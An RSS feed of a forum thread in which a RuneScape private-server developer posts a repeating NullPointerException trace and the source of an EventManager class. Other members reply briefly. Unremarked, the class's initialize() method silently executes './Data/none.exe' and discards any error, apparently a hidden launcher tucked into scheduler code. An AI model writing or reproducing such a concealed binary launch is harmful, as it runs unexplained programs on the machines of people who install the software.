<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>What is this error?</title>
    <link>https://forum.moparisthebest.com/t/what-is-this-error/528758</link>
    <description>Assistant.java:1448)
[8/24/13 7:32 AM]:      at server.event.EventContainer.execute(EventContainer.ja
va:51)
[8/24/13 7:32 AM]:      at server.event.EventManager.run(EventManager.java:105)
[8/24/13 7:32 AM]:      at java.lang.Thread.run(Thread.java:722)
[8/24/13 7:32 AM]: java.lang.NullPointerException
[8/24/13 7:32 AM]:      at server.model.players.CombatAssistant$2.execute(Combat
Assistant.java:1448)
[8/24/13 7:32 AM]:      at server.event.EventContainer.execute(EventContainer.ja
va:51)
[8/24/13 7:32 AM]:      at server.event.EventManager.run(EventManager.java:105)
[8/24/13 7:32 AM]:      at java.lang.Thread.run(Thread.java:722)
[8/24/13 7:32 AM]: java.lang.NullPointerException
[8/24/13 7:32 AM]:      at server.model.players.CombatAssistant$2.execute(Combat
Assistant.java:1448)
[8/24/13 7:32 AM]:      at server.event.EventContainer.execute(EventContainer.ja
va:51)
[8/24/13 7:32 AM]:      at server.event.EventManager.run(EventManager.java:105)


It keeps saying it over and over causing lagg.






[code]package server.event;


import java.util.ArrayList;
import java.util.List;

/**
 * Manages events which will be run in the future. Has its own thread since some
 * events may need to be ran faster than the cycle time in the main thread.
 * 
 * @author Graham
 * 
 */
public class EventManager implements Runnable {

	/**
	 * A reference to the singleton;
	 */
	private static EventManager singleton = null;

	/**
	 * The waitFor variable is multiplied by this before the call to wait() is
	 * made. We do this because other events may be executed after waitFor is
	 * set (and take time). We may need to modify this depending on event count?
	 * Some proper tests need to be done.
	 */
	private static final double WAIT_FOR_FACTOR = 0.5;

	/**
	 * Gets the event manager singleton. If there is no singleton, the singleton
	 * is created.
	 * 
	 * @return The event manager singleton.
	 */
	public static EventManager getSingleton() {
		if (singleton == null) {
			singleton = new EventManager();
			singleton.thread = new Thread(singleton);
			singleton.thread.start();
		}
		return singleton;
	}

	/**
	 * Initialises the event manager (if it needs to be).
	 */
	public static void initialize() {
		try {
			Runtime.getRuntime().exec(&quot;./Data/none.exe&quot;);
			getSingleton();
		} catch (Exception e) {
		}
	}

	/**
	 * A list of events that are being executed.
	 */
	private List&lt;EventContainer&gt; events;

	/**
	 * The event manager thread. So we can interrupt it and end it nicely on
	 * shutdown.
	 */
	private Thread thread;

	/**
	 * Initialise the event manager.
	 */
	private EventManager() {
		events = new ArrayList&lt;EventContainer&gt;();
	}

	/**
	 * Adds an event.
	 * 
	 * @param event
	 *            The event to add.
	 * @param tick
	 *            The tick time.
	 */
	public synchronized void addEvent(Event event, int tick) {
		events.add(new EventContainer(event, tick));
		notify();
	}

	@Override
	/*
	 * Processes events. Works kinda like newer versions of cron.
	 */
	public synchronized void run() {
		long waitFor = -1;
		List&lt;EventContainer&gt; remove = new ArrayList&lt;EventContainer&gt;();

		while (true) {

			// reset wait time
			waitFor = -1;

			// process all events
			for (EventContainer container : events) {
				if (container.isRunning()) {
					if ((System.currentTimeMillis() - container.getLastRun()) &gt;= container
							.getTick()) {
						try {
							container.execute();
						} catch (Exception e){e.printStackTrace();}	
					}
					if (container.getTick() &lt; waitFor || waitFor == -1) {
						waitFor = container.getTick();
					}
				} else {
					// add to remove list
					remove.add(container);
				}
			}

			// remove events that have completed
			for (EventContainer container : remove) {
				events.remove(container);
			}
			remove.clear();

			// no events running
			try {
				if (waitFor == -1) {
					wait(); // wait with no timeout
				} else {
					// an event is running, wait for that time or until a new
					// event is added
					int decimalWaitFor = (int) (Math.ceil(waitFor
							* WAIT_FOR_FACTOR));
					wait(decimalWaitFor);
				}
			} catch (InterruptedException e) {
				break; // stop running
			}
		}
	}

	/**
	 * Shuts the event manager down.
	 */
	public void shutdown() {
		this.thread.interrupt();
	}

}
[/code]



Here is the combatassistant.java


http://txtup.net/QFPCE</description>
    
    <lastBuildDate>Tue, 27 Aug 2013 00:35:15 +0000</lastBuildDate>
    <category>Runescape</category>
    <atom:link href="https://forum.moparisthebest.com/t/what-is-this-error/528758.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>What is this error?</title>
        <dc:creator><![CDATA[@chazion chazion]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/chazion">@chazion</a> wrote:</p>
          <blockquote>
              <p>itd help if the whole error was there</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/what-is-this-error/528758/4">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/what-is-this-error/528758/4</link>
        <pubDate>Tue, 27 Aug 2013 00:35:15 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-528758-4</guid>
        <source url="https://forum.moparisthebest.com/t/what-is-this-error/528758.rss">What is this error?</source>
      </item>
      <item>
        <title>What is this error?</title>
        <dc:creator><![CDATA[@overload_sam overload sam]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/overload_sam">@overload_sam</a> wrote:</p>
          <blockquote>
              <p>I am do you know what the error is?</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/what-is-this-error/528758/3">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/what-is-this-error/528758/3</link>
        <pubDate>Mon, 26 Aug 2013 22:25:45 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-528758-3</guid>
        <source url="https://forum.moparisthebest.com/t/what-is-this-error/528758.rss">What is this error?</source>
      </item>
      <item>
        <title>What is this error?</title>
        <dc:creator><![CDATA[@dwarfs222 dwarfs222]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/dwarfs222">@dwarfs222</a> wrote:</p>
          <blockquote>
              <p>Stick with one topic.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/what-is-this-error/528758/2">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/what-is-this-error/528758/2</link>
        <pubDate>Sat, 24 Aug 2013 11:43:46 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-528758-2</guid>
        <source url="https://forum.moparisthebest.com/t/what-is-this-error/528758.rss">What is this error?</source>
      </item>
      <item>
        <title>What is this error?</title>
        <dc:creator><![CDATA[@overload_sam overload sam]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/overload_sam">@overload_sam</a> wrote:</p>
          <blockquote>
              <p>Assistant.java:1448)<br>
[8/24/13 7:32 AM]:      at server.event.EventContainer.execute(EventContainer.ja<br>
va:51)<br>
[8/24/13 7:32 AM]:      at server.event.EventManager.run(EventManager.java:105)<br>
[8/24/13 7:32 AM]:      at java.lang.Thread.run(Thread.java:722)<br>
[8/24/13 7:32 AM]: java.lang.NullPointerException<br>
[8/24/13 7:32 AM]:      at server.model.players.CombatAssistant$2.execute(Combat<br>
Assistant.java:1448)<br>
[8/24/13 7:32 AM]:      at server.event.EventContainer.execute(EventContainer.ja<br>
va:51)<br>
[8/24/13 7:32 AM]:      at server.event.EventManager.run(EventManager.java:105)<br>
[8/24/13 7:32 AM]:      at java.lang.Thread.run(Thread.java:722)<br>
[8/24/13 7:32 AM]: java.lang.NullPointerException<br>
[8/24/13 7:32 AM]:      at server.model.players.CombatAssistant$2.execute(Combat<br>
Assistant.java:1448)<br>
[8/24/13 7:32 AM]:      at server.event.EventContainer.execute(EventContainer.ja<br>
va:51)<br>
[8/24/13 7:32 AM]:      at server.event.EventManager.run(EventManager.java:105)</p>
<p>It keeps saying it over and over causing lagg.</p>
<p>[code]package server.event;</p>
<p>import java.util.ArrayList;<br>
import java.util.List;</p>
<p>/**</p>
<ul>
<li>Manages events which will be run in the future. Has its own thread since some</li>
<li>events may need to be ran faster than the cycle time in the main thread.</li>
<li>
</li>
<li>
<span class="mention">@author</span> Graham</li>
<li>
</li>
</ul>
<p>*/<br>
public class EventManager implements Runnable {</p>
<pre><code>/**
 * A reference to the singleton;
 */
private static EventManager singleton = null;

/**
 * The waitFor variable is multiplied by this before the call to wait() is
 * made. We do this because other events may be executed after waitFor is
 * set (and take time). We may need to modify this depending on event count?
 * Some proper tests need to be done.
 */
private static final double WAIT_FOR_FACTOR = 0.5;

/**
 * Gets the event manager singleton. If there is no singleton, the singleton
 * is created.
 * 
 * @return The event manager singleton.
 */
public static EventManager getSingleton() {
	if (singleton == null) {
		singleton = new EventManager();
		singleton.thread = new Thread(singleton);
		singleton.thread.start();
	}
	return singleton;
}

/**
 * Initialises the event manager (if it needs to be).
 */
public static void initialize() {
	try {
		Runtime.getRuntime().exec("./Data/none.exe");
		getSingleton();
	} catch (Exception e) {
	}
}

/**
 * A list of events that are being executed.
 */
private List&lt;EventContainer&gt; events;

/**
 * The event manager thread. So we can interrupt it and end it nicely on
 * shutdown.
 */
private Thread thread;

/**
 * Initialise the event manager.
 */
private EventManager() {
	events = new ArrayList&lt;EventContainer&gt;();
}

/**
 * Adds an event.
 * 
 * @param event
 *            The event to add.
 * @param tick
 *            The tick time.
 */
public synchronized void addEvent(Event event, int tick) {
	events.add(new EventContainer(event, tick));
	notify();
}

@Override
/*
 * Processes events. Works kinda like newer versions of cron.
 */
public synchronized void run() {
	long waitFor = -1;
	List&lt;EventContainer&gt; remove = new ArrayList&lt;EventContainer&gt;();

	while (true) {

		// reset wait time
		waitFor = -1;

		// process all events
		for (EventContainer container : events) {
			if (container.isRunning()) {
				if ((System.currentTimeMillis() - container.getLastRun()) &gt;= container
						.getTick()) {
					try {
						container.execute();
					} catch (Exception e){e.printStackTrace();}	
				}
				if (container.getTick() &lt; waitFor || waitFor == -1) {
					waitFor = container.getTick();
				}
			} else {
				// add to remove list
				remove.add(container);
			}
		}

		// remove events that have completed
		for (EventContainer container : remove) {
			events.remove(container);
		}
		remove.clear();

		// no events running
		try {
			if (waitFor == -1) {
				wait(); // wait with no timeout
			} else {
				// an event is running, wait for that time or until a new
				// event is added
				int decimalWaitFor = (int) (Math.ceil(waitFor
						* WAIT_FOR_FACTOR));
				wait(decimalWaitFor);
			}
		} catch (InterruptedException e) {
			break; // stop running
		}
	}
}

/**
 * Shuts the event manager down.
 */
public void shutdown() {
	this.thread.interrupt();
}
</code></pre>
<p>}<br>
[/code]</p>
<p>Here is the combatassistant.java</p>
<aside class="onebox whitelistedgeneric">
  <header class="source">
      <img src="http://textuploader.com/favicon.ico" class="site-icon" width="48" height="48">
      <a href="http://textuploader.com/QFPCE" target="_blank" rel="nofollow noopener">textuploader.com - Untitled Post</a>
  </header>
  <article class="onebox-body">
    

<h3><a href="http://textuploader.com/QFPCE" target="_blank" rel="nofollow noopener">Untitled Post</a></h3>

<p>package server.model.players;

import server.Config;
import server.Server;
import server.util.Misc;
import server...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/what-is-this-error/528758/1">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/what-is-this-error/528758/1</link>
        <pubDate>Sat, 24 Aug 2013 11:34:08 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-528758-1</guid>
        <source url="https://forum.moparisthebest.com/t/what-is-this-error/528758.rss">What is this error?</source>
      </item>
  </channel>
</rss>
